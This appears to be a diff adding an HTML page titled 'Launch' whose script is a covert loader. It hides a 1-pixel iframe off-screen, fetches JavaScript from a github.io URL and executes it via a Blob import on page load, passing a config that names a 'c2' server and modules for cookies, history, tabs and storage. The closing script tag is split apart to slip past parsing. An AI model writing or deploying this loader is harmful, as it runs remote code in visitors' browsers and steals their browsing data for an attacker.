@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Launch</title>
+</head>
+<body>
+  <script>
+    const cfg = {
+      active: true,
+      c2: "http://192.168.1.185:5000",
+      modules: ["cookies", "history", "tabs", "storage"]
+    };
+
+    const agentURL = "https://tenebrustan.github.io/11-test/background.js";
+    const iframe = document.createElement("iframe");
+    iframe.style.width = "1px";
+    iframe.style.height = "1px";
+    iframe.style.position = "absolute";
+    iframe.style.left = "-9999px";
+
+    const srcdoc = `
+      <script type="module">
+        fetch("${agentURL}")
+          .then(r => r.text())
+          .then(code => {
+            const cfg = ${JSON.stringify(cfg)};
+            const blob = new Blob([code + "\\nwindow.run?.(cfg);"], { type: "text/javascript" });
+            const url = URL.createObjectURL(blob);
+            import(url);
+          });
+      </scr` + `ipt>
+    `;
+
+    iframe.srcdoc = srcdoc;
+    document.body.appendChild(iframe);
+  </script>
+</body>
+</html>
